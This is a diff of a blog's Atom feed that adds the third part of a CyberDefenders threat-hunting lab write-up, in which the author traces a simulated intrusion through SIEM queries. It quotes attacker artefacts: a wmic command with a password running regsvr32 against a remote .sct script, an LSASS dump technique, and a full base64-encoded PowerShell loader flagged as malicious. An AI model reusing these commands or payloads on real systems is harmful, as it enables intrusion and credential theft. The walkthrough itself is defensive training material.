@@ -1,11 +1,162 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>AccidentalRebel.com</title><link href="http://www.accidentalrebel.com/" rel="alternate"></link><link href="http://www.accidentalrebel.com/feeds/all.atom.xml" rel="self"></link><id>http://www.accidentalrebel.com/</id><updated>2021-10-30T12:00:00+08:00</updated><entry><title>Cyber Corp Case 2 Writeup - Part 2</title><link href="http://www.accidentalrebel.com/cyber-corp-case-2-writeup-part-2.html" rel="alternate"></link><published>2021-10-30T12:00:00+08:00</published><updated>2021-10-30T12:00:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-10-30:/cyber-corp-case-2-writeup-part-2.html</id><content type="html">&lt;p&gt;The &lt;a href="https://cyberdefenders.org/labs/75"&gt;second case of the CyberCorp challenge&lt;/a&gt; on &lt;a href="https://cyberdefenders.org/"&gt;CyberDefenders.org&lt;/a&gt; is all about threat hunting. Created by &lt;a href="https://twitter.com/BlackMatter23"&gt;@BlackMatter23&lt;/a&gt; and his team, this challenge is based on a real-world attack so it is perfect for gaining practical experience on threat hunting.&lt;/p&gt;
-&lt;p&gt;This writeup is part 2 out of multiple parts. You could read &lt;a href="threat-hunting-from-home-cyber-corp-wmi-persistence"&gt;Part 1 here&lt;/a&gt;.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>AccidentalRebel.com</title><link href="http://www.accidentalrebel.com/" rel="alternate"></link><link href="http://www.accidentalrebel.com/feeds/all.atom.xml" rel="self"></link><id>http://www.accidentalrebel.com/</id><updated>2021-11-06T11:10:00+08:00</updated><entry><title>Cyber Corp Case 2 Writeup - Part 3</title><link href="http://www.accidentalrebel.com/cyber-corp-case-2-writeup-part-3.html" rel="alternate"></link><published>2021-11-06T11:10:00+08:00</published><updated>2021-11-06T11:10:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-11-06:/cyber-corp-case-2-writeup-part-3.html</id><content type="html">&lt;p&gt;The &lt;a href="https://cyberdefenders.org/labs/75"&gt;second case of the CyberCorp challenge&lt;/a&gt; on &lt;a href="https://cyberdefenders.org/"&gt;CyberDefenders.org&lt;/a&gt; is all about threat hunting. Created by &lt;a href="https://twitter.com/BlackMatter23"&gt;@BlackMatter23&lt;/a&gt; and his team, this challenge is based on a real-world attack so it is perfect for gaining practical experience in threat hunting.&lt;/p&gt;
+&lt;p&gt;This write-up is the third and final part of this walkthrough. You could read &lt;a href="threat-hunting-from-home-cyber-corp-wmi-persistence"&gt;Part 1 here&lt;/a&gt; and &lt;a href="cyber-corp-case-2-writeup-part-2"&gt;Part 2 here&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id="finding-the-post-reverse-shell-activity"&gt;Finding the post-reverse shell activity&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Question 11. As a result of running a malicious code, which we talk about in questions 9 and 10, the attacker got a shell on the compromised host. Using this access, the attacker downloaded the Active Directory collection utility to the host in an encoded form. Specify a comma-separated, non-spaced link where the encoded version of the utility was downloaded and a SHA256 hash of the decoded version that was directly run by the attacker on the compromised host.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;So from the question, I knew that the download happened after the reverse-shell was run. And so I changed the start date timestamp to &lt;code&gt;Jun 22, 2021 @ 07:41:56.000&lt;/code&gt;. I also knew that because there was a downloaded file, there would definitely be "NetworkConnection" and "FileCreate" events that would happen afterward. And so, the query I've created is this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;event_type:FileCreate OR event_type:NetworkConnection&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-01" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-01.png" /&gt;&lt;/p&gt;
+&lt;p&gt;The result shows &lt;code&gt;cmd.exe&lt;/code&gt; creating a &lt;code&gt;certutil.exe&lt;/code&gt; process. And the reason why this is suspicious is that &lt;code&gt;certutil.exe&lt;/code&gt; can be used as an alternative way of downloading files from an external source. You can read more about this &lt;a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The next event shows &lt;code&gt;certutil.exe&lt;/code&gt; establishing a connection to an external IP and downloading the file &lt;code&gt;chrome_installer.log2:data&lt;/code&gt;. This tells us the first half of the answer to the question.&lt;/p&gt;
+&lt;p&gt;The next step is to find out the SHA256 of the decoded version of the downloaded file. I then updated the timestamp to &lt;code&gt;Jun 22, 2021 @ 07:46:10.000&lt;/code&gt;, which is the time the file was downloaded, and then used the query:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;event_type:ProcessCreate AND enrich.ioa.max_severity:*&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-02" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-02.png" /&gt;&lt;/p&gt;
+&lt;p&gt;We could see that &lt;code&gt;cmd.exe&lt;/code&gt; created the process &lt;code&gt;svchost.exe&lt;/code&gt;, but the suspicious thing is that the process' directory is &lt;code&gt;c:\windows\temp\&lt;/code&gt; which is highly unusual for &lt;code&gt;svchost.exe&lt;/code&gt; to run from. We can easily assume that the previously downloaded &lt;code&gt;chrome_installer.log2&lt;/code&gt; was renamed to &lt;code&gt;svchost.exe&lt;/code&gt; and this is the one that it ran. Getting the hash for this file will give us the second half of our answer to this question.&lt;/p&gt;
+&lt;h2 id="finding-the-dump-file"&gt;Finding the dump file&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Question 12. During the post-exploitation process, the attacker used one of the standard Windows utilities to create a memory dump of a sensitive system process that contains credentials of active users in the system. Specify the name of the executable file of the utility used and the name of the memory dump file created, separated by a comma without spaces.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Without changing the date range and the query from the previous question, I continued to investigate the other events that have a value of &lt;code&gt;high&lt;/code&gt; in its &lt;code&gt;enrich.ioa.max_severity&lt;/code&gt; field. The event below happened a few seconds after the event from the previous question.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-03" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-03.png" /&gt;&lt;/p&gt;
+&lt;p&gt;From the &lt;code&gt;enrich.ioa.rules&lt;/code&gt; field we can see the value &lt;code&gt;win_memory_dumping_via_comsvcs_minidump&lt;/code&gt;. What happened was that &lt;code&gt;rundll32.exe&lt;/code&gt; executed the &lt;code&gt;comsvs.dll&lt;/code&gt; and dumped the LSASS memory into a dump file. You can learn more about this technique &lt;a href="https://attack.mitre.org/techniques/T1003/001/"&gt;here&lt;/a&gt;. Here is that technique visualized with &lt;a href="https://github.com/accidentalrebel/vATTACK"&gt;my vATT&amp;amp;CK tool&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-04" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-04.png" /&gt;&lt;/p&gt;
+&lt;p&gt;From the information above, we now have what we need to answer the question.&lt;/p&gt;
+&lt;h2 id="detecting-lateral-movement"&gt;Detecting lateral movement&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Question 13. Presumably, the attacker extracted the password of one of the privileged accounts from the memory dump we discussed in the previous question and used it to run a malicious code on one of the domain controllers. What account are we talking about? Specify its username and password as the answer in login:password format.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The first thing I wanted to find out was to figure out what the IP of the domain controller is. I knew that there is a Windows event ID &lt;code&gt;5308 (Microsoft-Windows-Group-Policy)&lt;/code&gt; that lists the domain controller details. So I made a query based on that and also added in search for the texts "domain" and "controller".&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;event_id:5308 AND ("domain" OR "controller")&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And this gave me exactly what I was looking for:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Domain Controller details: 
+    Domain Controller Name : DC01-CYBERCORP.cybercorp.com
+    Domain Controller IP Address : 192.168.184.100
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that I know the IP, I can now search for any events related to this IP:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;net_dst_ipv4:192.168.184.100 AND enrich.ioa.max_severity:*&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-05" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-05.png" /&gt;&lt;/p&gt;
+&lt;p&gt;As we can see, we have a &lt;code&gt;wmic&lt;/code&gt; command that passes the username and password to the domain controller's IP. This answers question 13.&lt;/p&gt;
+&lt;h2 id="side-quest-tracing-the-next-steps"&gt;Side Quest: Tracing the next steps&lt;/h2&gt;
+&lt;p&gt;I wanted to find out what exactly happens when the command line from the previous question is run:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;wmic  /node:192.168.184.100 /user:inventory /password:jschindler35 process call create 'regsvr32 /u /n /s /i:http://94.177.253.126:8080/Ec9KoccK.sct scrobj.dll'&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;From &lt;a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md#atomic-test-6---wmi-execute-remote-process"&gt;my research&lt;/a&gt;, I learned that this is using WMI to execute a process on a remote host. In this case, &lt;code&gt;regsvr32&lt;/code&gt; is called to execute the specified remote &lt;code&gt;.sct&lt;/code&gt; file with &lt;code&gt;scrobj.dll&lt;/code&gt;. More info about this technique &lt;a href="https://attack.mitre.org/techniques/T1218/010/"&gt;here&lt;/a&gt; and &lt;a href="https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1218.010/T1218.010.md#atomic-test-2---regsvr32-remote-com-scriptlet-execution"&gt;here&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-06" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-06.png" /&gt;&lt;/p&gt;
+&lt;h2 id="the-second-group"&gt;The second group&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Question 14. A compromised user account is a member of two Built-in privileged groups on the Domain Controller. The first group is the Administrators. Find the second group. Provide the SID of this group as an answer.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;To solve this, we'll be needing to make a search query with the following information that we got from the previous questions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;inventory&lt;/code&gt; - The name of the compromised user account&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;DC01-CYBERCORP.cybercorp.com&lt;/code&gt; - The hostname of the domain controller&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;192.168.184.100&lt;/code&gt; - IP of the domain controller&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;("inventory&lt;em&gt;" OR "group&lt;/em&gt;") AND "DC01-CYBERCORP.cybercorp.com" AND dev_ipv4:192.168.184.100 AND usr_tgt_name:Inventory&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;There will be a lot of entries, but the one below would have information that we need:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-07" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-07.png" /&gt;&lt;/p&gt;
+&lt;p&gt;The event lists the group membership information for the user &lt;code&gt;inventory&lt;/code&gt;. Within the field &lt;code&gt;usr_token_groups&lt;/code&gt; we can see the following information:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-5-21-3899523589-2416674273-2941457644-513}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-1-0}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-5-32-544}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-5-32-551}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-5-32-545}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-5-32-554}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-5-2}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-5-11}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-5-15}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-18-1}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-5-21-3899523589-2416674273-2941457644-1105}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c"&gt;%{S-1-16-12288}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Based on &lt;a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-tokengroups"&gt;this&lt;/a&gt; and &lt;a href="https://morgantechspace.com/2015/08/active-directory-tokengroups-vs-memberof.html"&gt;this&lt;/a&gt;, User Token Groups contains the list of security identifiers for groups and that it holds both direct group membership and recursive list of nested groups. This means that the answer to our question is included in that list.&lt;/p&gt;
+&lt;p&gt;I decided to search for any mention of the SID format &lt;code&gt;S-1-...&lt;/code&gt;. So I changed the query to this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;"S-1-*" AND groups AND "DC01-CYBERCORP.cybercorp.com" AND dev_ipv4:192.168.184.100&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This revealed a new type of &lt;code&gt;event_type&lt;/code&gt; value which is &lt;code&gt;InventoryInfo&lt;/code&gt;, as shown below:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-08" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-08.png" /&gt;&lt;/p&gt;
+&lt;p&gt;This inventory info seems to be from an inventory collection tool, but I could not get more info more than that. What is important to us though is the &lt;code&gt;dev_inventory&lt;/code&gt; field which contains:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;...
+{
+    &amp;quot;sid&amp;quot;: &amp;quot;S-1-5-32-544&amp;quot;,
+    &amp;quot;name&amp;quot;: &amp;quot;BUILTIN\\Administrators&amp;quot;,
+    &amp;quot;members&amp;quot;: [
+        &amp;quot;CYBERCORP\\Administrator&amp;quot;,
+        &amp;quot;CYBERCORP\\Enterprise Admins&amp;quot;,
+        &amp;quot;CYBERCORP\\Domain Admins&amp;quot;,
+        &amp;quot;CYBERCORP\\inventory&amp;quot;
+    ]
+},
+...
+{
+    &amp;quot;sid&amp;quot;: &amp;quot;S-1-5-32-551&amp;quot;,
+    &amp;quot;name&amp;quot;: &amp;quot;BUILTIN\\Backup Operators&amp;quot;,
+    &amp;quot;members&amp;quot;: [
+        &amp;quot;CYBERCORP\\backupsrv&amp;quot;,
+        &amp;quot;CYBERCORP\\inventory&amp;quot;
+    ]
+},
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The information above shows us two groups that contain &lt;code&gt;inventory&lt;/code&gt; as one of their members. The question mentions something about &lt;code&gt;Administrators&lt;/code&gt; being the first group, then that means the other group is none other than &lt;code&gt;Backup Operators&lt;/code&gt;. Getting the sid of this is our answer to this question.&lt;/p&gt;
+&lt;h2 id="the-second-reverse-shell"&gt;The Second Reverse Shell&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Question 15. As a result of malicious code execution on the domain controller using a compromised account, the attacker got a reverse shell on that host. This shell used a previously not seen IP address as the command center. Specify its address as the answer.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;My initial approach was I set the start date to  &lt;code&gt;Jun 22, 2021 @ 08:21:22.000&lt;/code&gt; which is the timestamp when the attacker was able to run a remote code on the domain controller (See question #13). I also searched for &lt;code&gt;event_type&lt;/code&gt; with a value of &lt;code&gt;NetworkConnection&lt;/code&gt; and made sure that the events only happened in the domain controller's IP.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;event_type:NetworkConnection AND dev_ipv4:192.168.184.100&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This, however, showed too many events. There are just too many network events and too little information in the question to sift through them all.&lt;/p&gt;
+&lt;p&gt;I knew from the hint that the format of the IP is XXX.XXX.XX.XX. This already helps a lot in narrowing our options, but I still wanted to find it without relying on the hint.&lt;/p&gt;
+&lt;p&gt;So I used a different approach. My thought process was to start from when the initial code was ran on the domain controller and go see what happened next. This code ran &lt;code&gt;regsvr32&lt;/code&gt; which executed an external script (See Question #13). We could use in our query, and so we get:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;dev_ipv4:192.168.184.100 OR "regsvr32"&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The results of this query was more revealing:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-09" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-09.png" /&gt;&lt;/p&gt;
+&lt;p&gt;The very first entry is our &lt;code&gt;wmic&lt;/code&gt; event that used &lt;code&gt;regsvr32&lt;/code&gt;. This is followed by a PowerShell script accessing &lt;code&gt;lsass.exe&lt;/code&gt; and also injecting code into &lt;code&gt;svchost.exe&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;I then continued down the list of events to check for any outbound network connections with an IP that has not been previously seen. Unfortunately, the events are still too many to go through. Looking at the Top 5 values also wasn't of too much help.&lt;/p&gt;
+&lt;p&gt;Going back to the list of events we can see that immediately following the &lt;code&gt;wmic&lt;/code&gt; event, there is a &lt;code&gt;powershell&lt;/code&gt; process that accesses &lt;code&gt;lsass.exe&lt;/code&gt;. It also has a very interesting entry under the &lt;code&gt;proc_cmdline&lt;/code&gt; field:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s2"&gt;&amp;quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-nop&lt;/span&gt; &lt;span class="n"&gt;-w&lt;/span&gt; &lt;span class="n"&gt;hidden&lt;/span&gt; &lt;span class="n"&gt;-noni&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&amp;#39;H4sIADES+14CA7VWa2+bSBT9nEj5D6iyBCiOjV03yUaqtIAhxrVTU2z8qlVhGMPEw6MwxCbd/ve9Y0OaqmnVrrQIiXnc57ln5rLJI5fiOOLc8Sfuy9npychJnZATau51nauF7iUST05guZYlLp1zbzlhKSdJNw4dHK1ubtQ8TVFEj/PGLaJylqFwTTDKBJH7h5sGKEUX79f3yKXcF672qXFL4rVDSrFCddwAcRdy5LG9Qew6LJiGlRBMBf7jR15cXrRWDe1z7pBM4K0ioyhseITwIvdVZA7HRYIEfojdNM7iDW1McfS63ZhEmbNBd2DtAQ0RDWIv40VIA94U0TyNuGNCzMJxX+BhOEpjV/a8FGUZX+eWzPZytfpbWJaOP+QRxSFqGBFFaZxYKH3ALsoaPSfyCPqANivQsmiKI38liiD2EG+RUItyQurcn5gR7tCugu13lYTnSiA1oqlYh0q+lOgw9nKCjqr8C5FC+UV4KgoAdF/PTs9ONxVbvOI5WWB0sjyMEcQmjOIMH6TeclKdG4ITh8ZpAdPaOM2RuHpClqt9dus/125VoiDoZrCwtGPsrUChrGVto07MkG38nJRdtMER6haRE2K34p3wEsBoQ9AhvUYldgcxCXy5gbwuIsh3KEOM1fkHNS3E9ElXyTHxUCq7UKQMooL6id8HcyyCwBvREIUA0HEOxKttgO2oki4ZXlTe2RyEeJU4WVbnRjkcN7fOWcghyKtzcpThckvOaXwY8t/CHeaEYtfJaGVuJT4BWTpU4yijae5C0SD5sZUgFzuEYVHnethDSmFhv3LMv4iE6hAChwAsPUAlYIUhYFFGhRRihLKLDQtRI0wICkHicOx14vhwyEuiH5jj+MjjfwiwIvKRtQyLCoRn4UGBLRLTOmfjlML1wXB1s//i+9mlcYxCTVFZB6E6GUuloIzRtfU9o2OJyCH/lELuehqHipOhy87xehBeNTXcfTPqxo8yPJr+wbQVa2IvjKHXJ5ZBrbmGB5MgMHDL8GFeTDR/RKXk3Xjc61vdnpx298FGNjJD6ymF2VJkt4ev7L4ymYAeVgfm/d6QPSX0Z/5c3RmjYGaAI3XgGz58FSNwFWkh+YqkqwNLCTQsyb5l9sxOa2E0r4mCHy3DknvTJ39PfrROpzfbj+W7YV8O9Pee3mrrB/0t019sbwdd7TB32dycZxrWwI+mz007QFM7UaaavjDtxPDPd75pD5odPVBg3cD7QWI14Wm1+g+R9zgk149DCNe0F32MFoaPCl82ZdmaR8Ra71RZ7V49JHPJ2OoTWNuOjWhvrpOhV8x7zb/sIUZJLJuaLOsEjmMoO7tuszWN35n2G3OiSftiIu132n1zp+H+blt+J7eXl35z0xk1bcuIek6gQLxFv7PF/XPYCx1bmm+aNsOvq0XNx2hGnJHaism62Zrg7pWiGBj174Yu+axAzmDjjbmO1bYbbCAmw782/VkctZ0t2J36MkQH+UGdN30DdJSc4O3kfMZs9XdS2N9LLM6wfw2xtcsYZBoZsybEJ/e6lhrdWsas7SFdaZ67b18xygJna1vvGRN/1j2GTpoFDgGGQleorgQ9TvXyph/FmGkIAvs/2KI0QgTaKzTg6ljJhMQu6zPQEqDDHfsOa4MTGL5uvzgSuSdB8VvzqZZubhYQIhzU9X1jgCKfBnVp/1qSoJdI+44E6f1+UmqcFAIYqrNOBIgcrZKDVZGd21p6dfW/wlTeFQF8vF/D9G3tF7u/BZ1UZ6n+sPj9wh/h+KdZTx1MQdCCm46gY5t9KfmSDs9+QKAcUO1N+bBfyPc5vbiD35Kz038BKGgg/awKAAA=&amp;#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Decoding the base64 string would reveal a PowerShell script that has a hash that &lt;a href="https://www.virustotal.com/gui/file/f4a3fa10be15ad4414ce897a5d7fcd43d7a6f7b28855adbec76c545d72c87662/detection"&gt;VirusTotal flags as malicious&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-11" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-11.png" /&gt;&lt;/p&gt;
+&lt;p&gt;This is a good indication that this PowerShell process is up to no good. Now we need to find out what other things this process did. The process has a PID of 4460, so plugging that into a query we get:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;(proc_id:4460 OR proc_p_id:4460 OR proc_c_id:4460 OR proc_tgt_id:4460) AND dev_ipv4:192.168.184.100&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And these are the results:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-3-12" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-3-12.png" /&gt;&lt;/p&gt;
+&lt;p&gt;Looking at the external IP that the process is connecting to, we could see that this is something new that we have not seen before. Thankfully, I had been making a list of all internal and external IPs that I came across during the challenge (Just shows the importance of writing down every information you come across!). Plugging this IP is our solution to this problem.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;There we have it. We've gone through and answered all 15 questions. Congratulations if you've made it this far!&lt;/p&gt;
+&lt;p&gt;If you missed it, you could read &lt;a href="threat-hunting-from-home-cyber-corp-wmi-persistence"&gt;Part 1 here&lt;/a&gt; and &lt;a href="cyber-corp-case-2-writeup-part-2"&gt;Part 2 here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I hope that I was able to help you in understanding the process of solving this challenge. I had a lot of fun going through and writing about it. Again, thank you to &lt;a href="https://twitter.com/BlackMatter23"&gt;@BlackMatter23&lt;/a&gt; and the team for sharing this challenge and to &lt;a href="https://cyberdefenders.org/"&gt;CyberDefenders&lt;/a&gt; for hosting it.&lt;/p&gt;</content><category term="threat-hunting"></category><category term="threat-hunting"></category><category term="cyberdefenders"></category></entry><entry><title>Cyber Corp Case 2 Writeup - Part 2</title><link href="http://www.accidentalrebel.com/cyber-corp-case-2-writeup-part-2.html" rel="alternate"></link><published>2021-11-03T12:00:00+08:00</published><updated>2021-11-03T12:00:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-11-03:/cyber-corp-case-2-writeup-part-2.html</id><content type="html">&lt;p&gt;The &lt;a href="https://cyberdefenders.org/labs/75"&gt;second case of the CyberCorp challenge&lt;/a&gt; on &lt;a href="https://cyberdefenders.org/"&gt;CyberDefenders.org&lt;/a&gt; is all about threat hunting. Created by &lt;a href="https://twitter.com/BlackMatter23"&gt;@BlackMatter23&lt;/a&gt; and his team, this challenge is based on a real-world attack so it is perfect for gaining practical experience in threat hunting.&lt;/p&gt;
+&lt;p&gt;This writeup is part 2 out of multiple parts. You could read &lt;a href="threat-hunting-from-home-cyber-corp-wmi-persistence"&gt;Part 1 here&lt;/a&gt; and &lt;a href="cyber-corp-case-2-writeup-part-3"&gt;Part 3 here&lt;/a&gt;.&lt;/p&gt;
 &lt;h2 id="checking-dns-requests"&gt;Checking DNS Requests&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Question 6. Specify the domain name of the resource from which the files mentioned in question 5 were supposedly downloaded as a result of malicious code execution.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;This one is easy. Using the same daterange from the previous question, I changed the query to &lt;code&gt;event_type:DNSReq&lt;/code&gt; (where "DNSReq" is short for "DNS Requests").&lt;/p&gt;
+&lt;p&gt;This one is easy. Using the same date range from the previous question, I changed the query to &lt;code&gt;event_type:DNSReq&lt;/code&gt; (where "DNSReq" is short for "DNS Requests").&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-2-01" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-2-01.png" /&gt;&lt;/p&gt;
 &lt;p&gt;We could easily see a DNS record being queried, which is our answer to this question.&lt;/p&gt;
 &lt;h2 id="finding-the-encoded-executable-code"&gt;Finding the encoded executable code&lt;/h2&gt;
@@ -67,7 +218,7 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;/blockquote&gt;
 &lt;p&gt;Which showed the following results:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-2-09" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-2-09.png" /&gt;&lt;/p&gt;
-&lt;p&gt;The reason why the following events are interesting is that they contain the script inside the &lt;code&gt;script_text&lt;/code&gt; value. Since the script is too long the events are split of into 7 events as indicated by the &lt;code&gt;[1 of 7]&lt;/code&gt; in the description. I then copied all the &lt;code&gt;script_text&lt;/code&gt; entries and placed them into one file so I can easily review the code.&lt;/p&gt;
+&lt;p&gt;The reason why the following events are interesting is that they contain the script inside the &lt;code&gt;script_text&lt;/code&gt; value. Since the script is too long the events are split into 7 events as indicated by the &lt;code&gt;[1 of 7]&lt;/code&gt; in the description. I then copied all the &lt;code&gt;script_text&lt;/code&gt; entries and placed them into one file so I can easily review the code.&lt;/p&gt;
 &lt;p&gt;The hint mentioned something about &lt;code&gt;pid spoofing&lt;/code&gt; so I searched for the word &lt;code&gt;spoof&lt;/code&gt; in the code and found this part right here.&lt;/p&gt;
